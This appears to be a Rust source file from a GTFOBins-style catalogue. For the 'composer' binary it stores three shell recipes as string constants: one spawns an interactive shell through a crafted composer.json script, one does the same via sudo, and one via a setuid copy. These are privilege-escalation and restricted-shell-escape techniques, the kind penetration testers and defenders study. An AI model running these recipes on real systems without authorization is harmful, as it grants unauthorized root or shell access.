
pub static BIN_NAME: &'static str = "composer";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
    composer --working-dir=$TF run-script x
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
    sudo composer --working-dir=$TF run-script x
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which composer) .

    TF=$(mktemp -d)
    echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
    ./composer --working-dir=$TF run-script x
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
